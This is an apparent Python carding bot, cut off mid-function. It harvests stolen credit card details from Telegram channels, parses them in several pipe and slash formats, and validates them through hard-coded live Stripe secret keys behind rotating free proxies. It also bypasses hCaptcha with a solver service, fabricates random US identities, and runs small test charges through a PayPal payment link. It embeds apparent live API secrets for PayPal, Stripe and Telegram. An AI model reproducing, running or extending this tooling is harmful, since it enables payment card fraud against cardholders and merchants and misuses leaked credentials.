#!/usr/bin/env python3
"""

"""

import re
import asyncio
import logging
import os
import random
import json
import aiohttp
import requests
import time
import hashlib
import subprocess
import sys
import shutil
import glob
import urllib.parse
import threading
from datetime import datetime, timezone
from threading import Thread
from typing import Dict, Optional, List

# ======================================================================
# PayPal Live Key (your key – stored for future REST API use)
# ======================================================================
PAYPAL_LIVE_KEY = "EPOaZY5Pc9jGZzwU6u9zZIo_Huwm4XOGPt7pOkE5yvbxnFmdqG6OmtWfMMb30NocPcJLAa2IgtJlvMcN"

# ======================================================================
# FORCE LD_LIBRARY_PATH (fixes libnspr4.so missing on Replit)
# ======================================================================
def set_nix_library_path():
    if not (os.environ.get("REPL_ID") or os.path.exists("/home/runner/.replit")):
        return
    keywords = [
        "nspr", "nss", "atk", "at-spi2", "gtk3", "alsa-lib", "dbus", "glib",
        "libx11", "libxcb", "libxkbcommon", "libxcomposite", "libxdamage",
        "libxext", "libxfixes", "libxrandr", "expat", "cups",
        "mesa", "cairo", "pango",
    ]
    paths = set()
    try:
        nix_entries = os.listdir("/nix/store")
    except Exception:
        return
    for entry in nix_entries:
        lower = entry.lower()
        if lower.endswith(".drv") or lower.endswith("-dev") or lower.endswith("-doc"):
            continue
        for kw in keywords:
            if f"-{kw}-" in lower or lower.endswith(f"-{kw}"):
                lib_dir = f"/nix/store/{entry}/lib"
                if os.path.isdir(lib_dir):
                    paths.add(lib_dir)
                break
    if paths:
        existing = os.environ.get("LD_LIBRARY_PATH", "")
        os.environ["LD_LIBRARY_PATH"] = ":".join(paths) + (":" + existing if existing else "")
        print("[FIX] LD_LIBRARY_PATH updated.", flush=True)

set_nix_library_path()

# ======================================================================
# Write replit.nix only if missing
# ======================================================================
def ensure_replit_nix():
    flag_path = ".playwright_nix_configured"
    if os.path.exists(flag_path):
        return False
    nix_path = "replit.nix"
    if os.path.exists(nix_path):
        with open(nix_path, "r") as f:
            if "playwright" in f.read():
                open(flag_path, "w").close()
                return False
    content = '''{ pkgs }: {
  deps = [
    pkgs.playwright
    pkgs.nss
    pkgs.nspr
    pkgs.atk
    pkgs.at-spi2-atk
    pkgs.cups
    pkgs.libdrm
    pkgs.libxkbcommon
    pkgs.mesa
    pkgs.xorg.libXcomposite
    pkgs.xorg.libXdamage
    pkgs.xorg.libXrandr
    pkgs.xorg.libXtst
    pkgs.xorg.libXScrnSaver
    pkgs.xorg.libX11
    pkgs.xorg.libxcb
    pkgs.gtk3
    pkgs.alsa-lib
    pkgs.dbus
    pkgs.expat
    pkgs.fontconfig
    pkgs.libXrender
    pkgs.libXfixes
    pkgs.libXcursor
    pkgs.libXi
    pkgs.pango
    pkgs.cairo
    pkgs.libGL
    pkgs.glib
    pkgs.libxshmfence
  ];
}
'''
    with open(nix_path, "w") as f:
        f.write(content)
    open(flag_path, "w").close()
    print("[PLAYWRIGHT] Created replit.nix. Please STOP and RUN your Repl again.", flush=True)
    return True

if ensure_replit_nix():
    sys.exit(0)

# ======================================================================
# Auto‑install Chromium
# ======================================================================
def ensure_chromium_installed():
    cache_dirs = [
        os.path.expanduser("~/.cache/ms-playwright"),
        os.path.join(os.getcwd(), ".cache", "ms-playwright"),
    ]
    def _find_binary():
        for cache_dir in cache_dirs:
            for name in ["chrome", "chrome-headless-shell"]:
                try:
                    result = subprocess.run(["find", cache_dir, "-name", name, "-type", "f"], capture_output=True, text=True, timeout=5)
                    if result.stdout.strip():
                        return True
                except:
                    pass
        return False
    if _find_binary():
        print("[PLAYWRIGHT] Chromium already installed.", flush=True)
        return True
    print("[PLAYWRIGHT] Installing Chromium (1-2 min)...", flush=True)
    try:
        subprocess.run([sys.executable, "-m", "playwright", "install", "chromium"], check=True, timeout=180)
        print("[PLAYWRIGHT] Chromium installation completed.", flush=True)
        for _ in range(10):
            time.sleep(1)
            if _find_binary():
                print("[PLAYWRIGHT] Chromium binary found.", flush=True)
                return True
    except Exception as e:
        print(f"[PLAYWRIGHT] Installation error: {e}", flush=True)
    return False

# ======================================================================
# Playwright setup
# ======================================================================
CHROMIUM_INSTALLED = False
PLAYWRIGHT_OK = False
PLAYWRIGHT_EXECUTABLE_PATH = None

def find_chromium_executable():
    try:
        best = None
        for entry in os.listdir("/nix/store"):
            lower = entry.lower()
            if lower.endswith(".drv") or "-dev" in lower or "-doc" in lower:
                continue
            if re.match(r'^[a-z0-9]+-chromium-\d', lower) and "sandbox" not in lower:
                for name in ["chromium", "chromium-browser"]:
                    candidate = f"/nix/store/{entry}/bin/{name}"
                    if os.path.isfile(candidate) and os.access(candidate, os.X_OK):
                        if best is None or entry > best[0]:
                            best = (entry, candidate)
        if best:
            print(f"[PLAYWRIGHT] Using Nix chromium: {best[1]}", flush=True)
            return best[1]
    except Exception:
        pass
    cache_dirs = [
        os.path.expanduser("~/.cache/ms-playwright"),
        os.path.join(os.getcwd(), ".cache", "ms-playwright"),
    ]
    for cache_dir in cache_dirs:
        for pattern in [
            os.path.join(cache_dir, "chromium-*/chrome-linux*/chrome"),
            os.path.join(cache_dir, "chromium_headless_shell-*/chrome-headless-shell-linux64/chrome-headless-shell"),
        ]:
            matches = glob.glob(pattern)
            if matches:
                return matches[0]
    return None

def create_wrapper_script(real_chrome_path):
    wrapper_dir = os.path.expanduser("~/playwright-wrapper")
    os.makedirs(wrapper_dir, exist_ok=True)
    wrapper_path = os.path.join(wrapper_dir, "chromium-wrapper.sh")
    ld_path = os.environ.get("LD_LIBRARY_PATH", "")
    content = f"""#!/bin/bash
export LD_LIBRARY_PATH="{ld_path}"
exec "{real_chrome_path}" "$@"
"""
    with open(wrapper_path, "w") as f:
        f.write(content)
    os.chmod(wrapper_path, 0o755)
    print(f"[PLAYWRIGHT] Wrapper created at {wrapper_path}", flush=True)
    return wrapper_path

def setup_playwright():
    global CHROMIUM_INSTALLED, PLAYWRIGHT_OK, PLAYWRIGHT_EXECUTABLE_PATH
    CHROMIUM_INSTALLED = ensure_chromium_installed()
    if not CHROMIUM_INSTALLED:
        print("[PLAYWRIGHT] Chromium not installed – Playwright disabled.", flush=True)
        return False
    chrome_path = find_chromium_executable()
    if not chrome_path:
        print("[PLAYWRIGHT] Chromium binary not found.", flush=True)
        return False
    print(f"[PLAYWRIGHT] Found Chromium at {chrome_path}", flush=True)
    is_nix = chrome_path.startswith("/nix/store/")
    executable = chrome_path if is_nix else create_wrapper_script(chrome_path)
    if not executable:
        return False
    if not is_nix:
        print(f"[PLAYWRIGHT] Wrapper created at {executable}", flush=True)
    PLAYWRIGHT_EXECUTABLE_PATH = executable
    from playwright.sync_api import sync_playwright
    saved_ldpath = os.environ.pop("LD_LIBRARY_PATH", None)
    try:
        for label, path in [("primary", executable), ("fallback", chrome_path)]:
            try:
                with sync_playwright() as p:
                    browser = p.chromium.launch(
                        headless=True,
                        executable_path=path,
                        args=["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"]
                    )
                    browser.close()
                print(f"[PLAYWRIGHT] Playwright working ({label})!", flush=True)
                PLAYWRIGHT_EXECUTABLE_PATH = path
                PLAYWRIGHT_OK = True
                return True
            except Exception as e:
                print(f"[PLAYWRIGHT] {label} failed: {str(e)[:120]}", flush=True)
    finally:
        if saved_ldpath is not None:
            os.environ["LD_LIBRARY_PATH"] = saved_ldpath
    return False

from playwright.async_api import async_playwright as _real_async_playwright

class async_playwright:
    async def __aenter__(self):
        if PLAYWRIGHT_OK:
            self._ctx = _real_async_playwright()
            return await self._ctx.__aenter__()
        return self
    async def __aexit__(self, *args):
        if PLAYWRIGHT_OK and hasattr(self, "_ctx"):
            await self._ctx.__aexit__(*args)
    def chromium(self):
        class Dummy:
            async def launch(self, **kwargs):
                raise RuntimeError("Playwright unavailable")
        return Dummy()

# ======================================================================
# hCaptcha solver (CapSolver – replace key if you have one)
# ======================================================================
import capsolver
CAPSOLVER_API_KEY = os.environ.get("CAPSOLVER_API_KEY", "")
capsolver.api_key = CAPSOLVER_API_KEY

async def solve_hcaptcha(page):
    """Solve hCaptcha via CapSolver (primary) or checkbox click (fallback)."""
    try:
        # Detect hCaptcha iframe
        try:
            iframe_handle = await page.wait_for_selector('iframe[src*="hcaptcha"]', timeout=5000)
        except:
            # No hcaptcha iframe — might still be present via data-sitekey
            iframe_handle = None

        # Find sitekey
        sitekey = None
        if iframe_handle:
            src = await iframe_handle.get_attribute("src") or ""
            if 'sitekey=' in src:
                sitekey = src.split('sitekey=')[1].split('&')[0]
        if not sitekey:
            sitekey = await page.evaluate("""() => {
                const el = document.querySelector('[data-sitekey]');
                if (el) return el.getAttribute('data-sitekey');
                const r = document.querySelector('[name="h-captcha-response"]');
                if (r) {
                    const p = r.closest('[data-sitekey]');
                    if (p) return p.getAttribute('data-sitekey');
                }
                return null;
            }""")

        if not sitekey and not iframe_handle:
            return True  # No captcha present

        # --- CapSolver ---
        if sitekey and CAPSOLVER_API_KEY:
            try:
                loop = asyncio.get_event_loop()
                solution = await loop.run_in_executor(None, lambda: capsolver.solve({
                    "type": "HCaptchaTaskProxyless",
                    "websiteURL": page.url,
                    "websiteKey": sitekey,
                }))
                token = (solution.get("gRecaptchaResponse")
                         or solution.get("solution", {}).get("gRecaptchaResponse", ""))
                if token:
                    # Inject token into all response fields
                    await page.evaluate(f"""(tok) => {{
                        ['h-captcha-response','g-recaptcha-response'].forEach(name => {{
                            document.querySelectorAll('[name="'+name+'"]').forEach(el => {{
                                el.value = tok;
                                el.dispatchEvent(new Event('input', {{bubbles:true}}));
                                el.dispatchEvent(new Event('change', {{bubbles:true}}));
                            }});
                        }});
                        if (typeof hcaptcha !== 'undefined') {{
                            try {{ hcaptcha.submit(tok); }} catch(e) {{}}
                        }}
                        if (typeof grecaptcha !== 'undefined') {{
                            try {{ grecaptcha.execute(); }} catch(e) {{}}
                        }}
                    }}""", token)
                    await page.wait_for_timeout(1500)
                    # Click any visible submit / verify button
                    for btn_sel in ['button[type="submit"]', 'button:has-text("Verify")',
                                    'button:has-text("Submit")', 'input[type="submit"]',
                                    'form button']:
                        try:
                            b = await page.query_selector(btn_sel)
                            if b and await b.is_visible():
                                await b.click()
                                break
                        except:
                            pass
                    await page.wait_for_timeout(3000)
                    print("[CAPTCHA] CapSolver token injected & submitted", flush=True)
                    return True
            except Exception as e:
                print(f"[CAPTCHA] CapSolver error: {e}", flush=True)

        # --- Fallback: click hcaptcha checkbox in frame ---
        try:
            for frame in page.frames:
                if "hcaptcha" in frame.url:
                    for sel in ['#checkbox', '[id*="checkbox"]', '.check',
                                'input[type="checkbox"]', '[role="checkbox"]',
                                '.hcaptcha-checkbox', '[aria-checked]']:
                        try:
                            chk = await frame.query_selector(sel)
                            if chk:
                                box = await chk.bounding_box()
                                if box:
                                    await frame.hover(sel)
                                    await page.wait_for_timeout(300)
                                await chk.click()
                                await page.wait_for_timeout(500)
                                await frame.evaluate("() => { const el = document.querySelector('#checkbox,[id*=\"checkbox\"]'); if(el){ el.dispatchEvent(new MouseEvent('click',{bubbles:true})); } }")
                                await page.wait_for_timeout(4000)
                                print("[CAPTCHA] Clicked hcaptcha checkbox (fallback)", flush=True)
                                return True
                        except:
                            continue
        except Exception as e:
            print(f"[CAPTCHA] Frame click error: {e}", flush=True)

        # --- Last resort: click the iframe body ---
        if iframe_handle:
            try:
                await iframe_handle.click()
                await page.wait_for_timeout(3000)
            except:
                pass
        return False
    except Exception as e:
        print(f"[CAPTCHA] Unexpected error: {e}", flush=True)
        return False

# ======================================================================
# Proxy Manager (for PayPal only)
# ======================================================================
class ProxyManager:
    _proxies: List[str] = []
    _index = 0
    _last_fetch = 0
    _fetch_interval = 300
    _lock = threading.Lock()

    @classmethod
    def _init_lock(cls):
        if cls._lock is None:
            import threading
            cls._lock = threading.Lock()

    @classmethod
    def _test_proxy(cls, proxy_url: str, timeout: int = 8) -> bool:
        try:
            r = requests.get("https://api.stripe.com/v1", proxies={"https": proxy_url}, timeout=timeout)
            return r.status_code in (200, 401)
        except Exception:
            return False

    @classmethod
    def fetch(cls) -> List[str]:
        cls._init_lock()
        with cls._lock:
            now = time.time()
            if now - cls._last_fetch < cls._fetch_interval and cls._proxies:
                return cls._proxies
            sources = [
                "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text&timeout=8000",
                "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            ]
            raw = []
            for url in sources:
                try:
                    r = requests.get(url, timeout=15)
                    raw += [l.strip() for l in r.text.strip().splitlines() if l.strip() and ":" in l]
                except Exception:
                    continue
            seen = set()
            candidates = []
            for p in raw:
                if "//" not in p:
                    p = "http://" + p
                if p not in seen:
                    seen.add(p)
                    candidates.append(p)
            tested = []
            for p in candidates[:40]:
                if cls._test_proxy(p):
                    tested.append(p)
            cls._proxies = tested
            cls._last_fetch = now
            cls._index = 0
            print(f"[ProxyManager] {len(tested)} working proxies", flush=True)
            return tested

    @classmethod
    def get(cls) -> Optional[str]:
        cls._init_lock()
        with cls._lock:
            if not cls._proxies:
                return None
            proxy = cls._proxies[cls._index % len(cls._proxies)]
            cls._index += 1
            return proxy

    @classmethod
    def remove(cls, proxy_url: str):
        cls._init_lock()
        with cls._lock:
            if proxy_url in cls._proxies:
                cls._proxies.remove(proxy_url)

# ======================================================================
# Flask web server
# ======================================================================
from flask import Flask, jsonify
flask_app = Flask(__name__)
BOT_USERNAME = "Oxy"
PORT = int(os.environ.get("PORT", 5000))
RUN_MODE = os.environ.get("RUN_MODE", "both").lower()

@flask_app.route('/')
def home():
    return jsonify({"status": "alive", "bot": BOT_USERNAME, "playwright_ok": PLAYWRIGHT_OK})
@flask_app.route('/health')
def health():
    return jsonify({"status": "healthy"})
def run_flask():
    # Free the port: try fuser, then lsof, then Python socket steal
    for _cmd in (["fuser", "-k", f"{PORT}/tcp"], ["lsof", "-ti", f":{PORT}"]):
        try:
            out = subprocess.run(_cmd, capture_output=True, timeout=5)
            if _cmd[0] == "lsof" and out.stdout.strip():
                for _pid in out.stdout.decode().split():
                    try:
                        subprocess.run(["kill", "-9", _pid.strip()], capture_output=True, timeout=3)
                    except Exception:
                        pass
        except Exception:
            pass
    try:
        import socket as _sock
        _s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
        _s.setsockopt(_sock.SOL_SOCKET, _sock.SO_REUSEADDR, 1)
        _s.bind(("0.0.0.0", PORT))
        _s.close()
    except Exception:
        pass
    # Patch Werkzeug to always reuse the address — prevents "already in use" on restart
    try:
        from werkzeug.serving import BaseWSGIServer
        BaseWSGIServer.allow_reuse_address = True
    except Exception:
        pass
    import time as _t; _t.sleep(0.5)
    flask_app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False, threaded=True)

logging.basicConfig(filename="scraper.log", level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger()

# ======================================================================
# Telegram configuration
# ======================================================================
API_ID = 37079398
API_HASH = "678f499b4345b640ba83ed7b1fc1efc0"
SESSION_NAME = "mysession"
WATCHED_CHATS_FILE = "watched_chats.json"

DEFAULT_SOURCE_CHATS = [
    "https://t.me/+01N1N0nFYEA4MWRl",
    "newscrapper4",
    "cc_checker_Stuff",
    "xForceDropsBot",
    "X-Force Group",
]

def _load_watched_chats():
    if os.path.exists(WATCHED_CHATS_FILE):
        try:
            with open(WATCHED_CHATS_FILE, "r") as f:
                return json.load(f)
        except Exception:
            pass
    return list(DEFAULT_SOURCE_CHATS)

def _save_watched_chats(chats):
    try:
        with open(WATCHED_CHATS_FILE, "w") as f:
            json.dump(chats, f)
    except Exception:
        pass

SOURCE_CHATS_RAW = _load_watched_chats()
XFORCE_BOT_USERNAME = "xForceDropsBot"
FORWARD_TARGET = "OxyCondoneIt"

from telethon import TelegramClient, events
from telethon.errors import UserAlreadyParticipantError, FloodWaitError, MessageDeleteForbiddenError
from telethon.tl.functions.messages import ImportChatInviteRequest, CheckChatInviteRequest, RequestAppWebViewRequest
from telethon.tl.types import InputBotAppShortName, KeyboardButtonUrl

client = TelegramClient(SESSION_NAME, API_ID, API_HASH)

# ======================================================================
# Card extraction (supports simple and full pipe format)
# ======================================================================
def extract_card_from_text(text: str):
    if not text:
        return None
    # Normalize whitespace/newlines so multiline DOM text still matches
    text_flat = re.sub(r'\s+', ' ', text)

    # Format 1 — xForce simple: 4100390171972702|07/27|545
    xforce = re.search(
        r'(\d{16,19})\s*\|\s*(\d{1,2})\s*/\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        text_flat
    )
    if xforce:
        card, mm, yy, cvv = xforce.groups()
        if len(yy) == 2: yy = f"20{yy}"
        return (card, mm, yy, cvv)

    # Format 2 — full pipe: 4088325023362773|05/26|436|Name|Addr|...
    full_pipe = re.search(
        r'(\d{16,19})\s*\|\s*(\d{1,2})\s*/\s*(\d{2,4})\s*\|\s*(\d{3,4})\s*\|',
        text_flat
    )
    if full_pipe:
        card, mm, yy, cvv = full_pipe.groups()
        if len(yy) == 2: yy = f"20{yy}"
        return (card, mm, yy, cvv)

    # Format 3 — all pipes: card|mm|yy|cvv
    all_pipes = re.search(
        r'(\d{16,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        text_flat
    )
    if all_pipes:
        card, mm, yy, cvv = all_pipes.groups()
        if len(yy) == 2: yy = f"20{yy}"
        return (card, mm, yy, cvv)

    # Format 4 — slash only: card/mm/yy/cvv or card mm/yy cvv
    slash_fmt = re.search(
        r'(\d{16,19})\s*[\/|\s]\s*(\d{1,2})\s*[\/]\s*(\d{2,4})\s*[\/|\s|]\s*(\d{3,4})',
        text_flat
    )
    if slash_fmt:
        card, mm, yy, cvv = slash_fmt.groups()
        if len(yy) == 2: yy = f"20{yy}"
        return (card, mm, yy, cvv)

    # Fallback — card + mm/yy only (no cvv found)
    partial = re.search(
        r'(\d{16,19})\s*[|\/]\s*(\d{1,2})\s*[|\/]\s*(\d{2,4})',
        text_flat
    )
    if partial:
        card, mm, yy = partial.groups()
        if len(yy) == 2: yy = f"20{yy}"
        return (card, mm, yy, "000")

    return None

# ======================================================================
# BIN lookup (binlist primary + bincheck fallback)
# ======================================================================
async def get_bin_info(bin6: str) -> dict:
    bin6 = bin6[:6]
    async with aiohttp.ClientSession() as sess:
        # 1) bins.antipublic.cc — free, reliable, no auth
        try:
            async with sess.get(
                f"https://bins.antipublic.cc/bins/{bin6}",
                timeout=aiohttp.ClientTimeout(total=8)
            ) as resp:
                if resp.status == 200:
                    data = await resp.json(content_type=None)
                    if data and data.get("brand"):
                        return {
                            "bank": data.get("bank", "Unknown"),
                            "brand": (data.get("brand") or "UNKNOWN").upper(),
                            "type": (data.get("type") or "UNKNOWN").upper(),
                            "country": data.get("country_name", "Unknown"),
                            "country_code": data.get("country_code", "XX"),
                            "prepaid": data.get("prepaid", False),
                            "level": (data.get("level") or "STANDARD").upper(),
                        }
        except Exception as e:
            print(f"[BIN] antipublic failed: {e}", flush=True)

        # 2) lookup.binlist.net — may rate-limit, keep as second
        try:
            async with sess.get(
                f"https://lookup.binlist.net/{bin6}",
                headers={"Accept-Version": "3"},
                timeout=aiohttp.ClientTimeout(total=10)
            ) as resp:
                if resp.status == 200:
                    data = await resp.json(content_type=None)
                    return {
                        "bank": data.get("bank", {}).get("name", "Unknown"),
                        "brand": (data.get("scheme") or "UNKNOWN").upper(),
                        "type": (data.get("type") or "UNKNOWN").upper(),
                        "country": data.get("country", {}).get("name", "Unknown"),
                        "country_code": data.get("country", {}).get("alpha2", "XX"),
                        "prepaid": data.get("prepaid", False),
                        "level": (data.get("brand") or "STANDARD").upper(),
                    }
        except Exception as e:
            print(f"[BIN] binlist failed: {e}", flush=True)

        # 3) handyapi.com — free, no auth
        try:
            async with sess.get(
                f"https://data.handyapi.com/bin/{bin6}",
                timeout=aiohttp.ClientTimeout(total=8)
            ) as resp:
                if resp.status == 200:
                    data = await resp.json(content_type=None)
                    if data.get("Status") == "Success":
                        return {
                            "bank": data.get("Issuer", "Unknown"),
                            "brand": (data.get("Scheme") or "UNKNOWN").upper(),
                            "type": (data.get("Type") or "UNKNOWN").upper(),
                            "country": data.get("Country", {}).get("Name", "Unknown"),
                            "country_code": data.get("Country", {}).get("A2", "XX"),
                            "prepaid": False,
                            "level": (data.get("CardTier") or "STANDARD").upper(),
                        }
        except Exception as e:
            print(f"[BIN] handyapi failed: {e}", flush=True)

    return None

# ======================================================================
# Stripe Authorizer
# ======================================================================
STRIPE_KEYS = [
    "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",
    "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"
]

def stripe_authorize(card_str: str) -> str:
    parts = card_str.split("|")
    if len(parts) < 4: return "ERROR|Invalid format"
    number, month, year, cvc = parts[0], parts[1], parts[2], parts[3]
    if len(year) == 2: year = "20" + year
    for key in STRIPE_KEYS:
        headers = {"Authorization": f"Bearer {key}", "Content-Type": "application/x-www-form-urlencoded"}
        data = {"type": "card", "card[number]": number, "card[exp_month]": month, "card[exp_year]": year, "card[cvc]": cvc}
        proxy = ProxyManager.get()
        proxies = {"https": proxy} if proxy else None
        for attempt in range(3):
            try:
                response = requests.post("https://api.stripe.com/v1/payment_methods", headers=headers, data=data, timeout=15, proxies=proxies)
                if response.status_code == 429:
                    if proxy: ProxyManager.remove(proxy)
                    proxy = ProxyManager.get()
                    proxies = {"https": proxy} if proxy else None
                    time.sleep(2)
                    continue
                if response.status_code == 200:
                    return "AUTHORIZED ✅|PaymentMethod created"
                elif response.status_code == 402:
                    err = response.json().get("error", {}).get("message", "Card declined")
                    return f"DECLINED ❌|{err}"
                else:
                    err_msg = response.json().get("error", {}).get("message", "Unknown error")
                    if "incorrect" in err_msg.lower() or "invalid" in err_msg.lower():
                        return f"DECLINED ❌|{err_msg}"
                    break
            except requests.exceptions.ProxyError:
                if proxy: ProxyManager.remove(proxy)
                proxy = ProxyManager.get()
                proxies = {"https": proxy} if proxy else None
                continue
            except Exception:
                continue
    return "ERROR|All Stripe keys failed"

# ======================================================================
# PayPal NCP Charger – uses paypal.com/ncp/payment link
# ======================================================================
CHARGE_AMOUNT = 1.00

NCP_PAYMENT_LINK = "https://www.paypal.com/ncp/payment/7QLK23ACRBU2L"
NCP_TOKEN = "7QLK23ACRBU2L"
_BASE_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
}

class PayPalCharger:
    def __init__(self, proxy=None, bin_country=None):
        self.session = requests.Session()
        self.session.headers.update(_BASE_HEADERS)
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}
        self._proxy = proxy
        self._bin_country = bin_country

    # ------------------------------------------------------------------
    # Large random US address generator (1000s of combinations)
    # ------------------------------------------------------------------
    def _random_us_address(self) -> Dict[str, str]:
        # First names (100+)
        first_names = ["James","John","Robert","Michael","William","David","Richard","Joseph","Thomas","Charles",
                       "Christopher","Daniel","Matthew","Anthony","Donald","Mark","Paul","Steven","Andrew","Kenneth",
                       "Joshua","Kevin","Brian","George","Edward","Ronald","Timothy","Jason","Jeffrey","Ryan",
                       "Jacob","Gary","Nicholas","Eric","Jonathan","Stephen","Larry","Justin","Scott","Brandon",
                       "Benjamin","Samuel","Gregory","Frank","Alexander","Raymond","Patrick","Jack","Dennis","Jerry",
                       "Mary","Patricia","Jennifer","Linda","Elizabeth","Barbara","Susan","Jessica","Sarah","Karen",
                       "Nancy","Lisa","Betty","Margaret","Sandra","Ashley","Kimberly","Emily","Donna","Michelle",
                       "Carol","Amanda","Melissa","Deborah","Stephanie","Rebecca","Laura","Sharon","Cynthia","Kathleen",
                       "Amy","Angela","Shirley","Brenda","Anna","Pamela","Nicole","Ruth","Katherine","Virginia"]
        # Last names (100+)
        last_names = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez",
                      "Hernandez","Lopez","Gonzalez","Wilson","Anderson","Thomas","Taylor","Moore","Jackson","Martin",
                      "Lee","Perez","Thompson","White","Harris","Sanchez","Clark","Ramirez","Lewis","Robinson",
                      "Walker","Young","Allen","King","Wright","Scott","Torres","Nguyen","Hill","Flores",
                      "Green","Adams","Nelson","Baker","Hall","Rivera","Campbell","Mitchell","Carter","Roberts",
                      "Gomez","Phillips","Evans","Turner","Diaz","Parker","Cruz","Edwards","Collins","Reyes"]
        # Street names (100+)
        street_names = ["Maple","Oak","Pine","Cedar","Birch","Elm","Walnut","Chestnut","Spruce","Willow",
                        "Park","Lake","Hill","Main","Broadway","Lincoln","Washington","Franklin","Adams","Jefferson",
                        "Madison","Monroe","Jackson","Grant","Harrison","Cleveland","Wilson","Roosevelt","Kennedy","Reagan",
                        "Peachtree","Magnolia","Highland","Forest","Ridge","Valley","Meadow","Brook","River","Sunset",
                        "Sunrise","Moonlight","Star","Sky","Cloud","Mountain","Ocean","Beach","Island","Harbor"]
        street_suffixes = ["St","Ave","Rd","Dr","Ln","Ct","Blvd","Way","Place","Circle","Terrace","Lane","Court","Drive","Parkway"]
        # Cities (100+)
        cities = ["Springfield","Columbus","Charlotte","Phoenix","Austin","Denver","Nashville","Portland","Louisville","Memphis",
                  "Seattle","Las Vegas","Minneapolis","San Antonio","Jacksonville","Indianapolis","Fort Worth","San Jose","El Paso","Baltimore",
                  "Boston","Detroit","Milwaukee","Albuquerque","Tucson","Fresno","Sacramento","Kansas City","Mesa","Atlanta",
                  "Omaha","Raleigh","Miami","Cleveland","Tulsa","Oakland","New Orleans","Arlington","Wichita","Bakersfield",
                  "Tampa","Honolulu","Anaheim","Santa Ana","Corpus Christi","Riverside","St. Louis","Lexington","Pittsburgh","Anchorage"]
        # States (all 50)
        states = ["AL","AK","AZ","AR","CA","CO","CT","DE","FL","GA","HI","ID","IL","IN","IA","KS","KY","LA","ME","MD",
                  "MA","MI","MN","MS","MO","MT","NE","NV","NH","NJ","NM","NY","NC","ND","OH","OK","OR","PA","RI","SC",
                  "SD","TN","TX","UT","VT","VA","WA","WV","WI","WY"]
        # ZIP codes (random 5-digit)
        def random_zip():
            return f"{random.randint(10000, 99950):05d}"
        # Phone area codes (100+)
        area_codes = ["201","202","203","205","206","207","208","209","210","212","213","214","215","216","217","218","219",
                      "224","225","227","228","229","231","234","239","240","248","251","252","253","254","256","260","262",
                      "267","269","270","272","276","279","281","283","301","302","303","304","305","307","308","309","310",
                      "312","313","314","315","316","317","318","319","320","321","323","325","327","330","331","334","336",
                      "337","339","340","346","347","351","352","360","361","364","380","385","386","401","402","404","405",
                      "406","407","408","409","410","412","413","414","415","417","419","423","424","425","430","432","434",
                      "435","440","442","443","445","458","469","470","475","478","479","480","484","501","502","503","504",
                      "505","507","508","509","510","512","513","515","516","517","518","520","530","531","534","539","540",
                      "541","551","559","561","562","563","564","567","570","571","573","574","575","580","585","586","601",
                      "602","603","604","605","606","607","608","609","610","612","613","614","615","616","617","618","619",
                      "620","623","626","628","629","630","631","636","641","646","650","651","657","659","660","661","662",
                      "667","669","678","681","682","701","702","703","704","706","707","708","712","713","714","715","716",
                      "717","718","719","720","724","725","727","730","731","732","734","737","740","743","747","754","757",
                      "760","762","763","765","769","770","772","773","774","775","779","781","785","786","787","801","802",
                      "803","804","805","806","810","812","813","814","815","816","817","818","828","830","831","832","835",
                      "843","845","847","848","850","856","857","858","859","860","862","863","864","865","870","872","878",
                      "901","903","904","906","907","908","909","910","912","913","914","915","916","917","918","919","920",
                      "925","928","931","934","936","937","940","941","947","949","951","952","954","956","959","970","971",
                      "972","973","978","979","980","984","985","989"]
        first = random.choice(first_names)
        last = random.choice(last_names)
        street_num = random.randint(100, 9999)
        street = f"{street_num} {random.choice(street_names)} {random.choice(street_suffixes)}"
        city = random.choice(cities)
        state = random.choice(states)
        zipcode = random_zip()
        domains = ["gmail.com","yahoo.com","outlook.com","hotmail.com","icloud.com","protonmail.com","aol.com",
                   "mail.com","yandex.com","zoho.com","gmx.com","fastmail.com","tutanota.com","hey.com","me.com"]
        email = f"{first.lower()}.{last.lower()}{random.randint(10,99999)}@{random.choice(domains)}"
        phone = f"{random.choice(area_codes)}{random.randint(1000000,9999999)}"
        return {
            "first_name": first,
            "last_name": last,
            "email": email,
            "line1": street,
            "city": city,
            "state": state,
            "postal": zipcode,
            "phone": phone,
            "region": "US",
        }

    def _random_donor(self) -> Dict[str, str]:
        return self._random_us_address()

    def _random_amount(self) -> float:
        return CHARGE_AMOUNT

    def _get_form_data(self, retries=3):
        """Fetch NCP payment page and extract clientId + csrfToken."""
        for attempt in range(retries):
            try:
                headers = dict(_BASE_HEADERS)
                headers.update({"Referer": "https://www.paypal.com/",
                                 "Accept": "text/html,application/xhtml+xml,*/*"})
                r = self.session.get(NCP_PAYMENT_LINK, headers=headers, timeout=20)
                r.raise_for_status()
                html = r.text

                # clientId: PayPal live client IDs start with A and are 60–90 mixed-case chars
                client_id = None
                for pattern in [
                    r'"clientId"\s*:\s*"([^"]{10,})"',
                    r'"client_id"\s*:\s*"([^"]{10,})"',
                    r'data-client-id="([^"]{10,})"',
                    r'"(A[A-Za-z0-9_-]{55,90})"',   # bare token as embedded JSON value
                ]:
                    m = re.search(pattern, html)
                    if m:
                        candidate = m.group(1)
                        # Skip obviously non-clientId strings
                        if len(candidate) >= 40 and not candidate.startswith("http"):
                            client_id = candidate
                            break

                # Fallback: use the known static clientId for this NCP link
                if not client_id:
                    client_id = "AXI9ufE0S2cbFXEi71kHRu9MaQbN01UYPuQidJxjE_t00Yk6NdSr0joXht4Z3NNvw6pjZSCqG-p99FZS"
                    print("[PayPal NCP] Using hardcoded fallback clientId", flush=True)

                # csrfToken — embedded in page JSON state, rotates each page load
                csrf_token = None
                m_csrf = re.search(r'"csrfToken"\s*:\s*"([^"]{8,})"', html)
                if m_csrf:
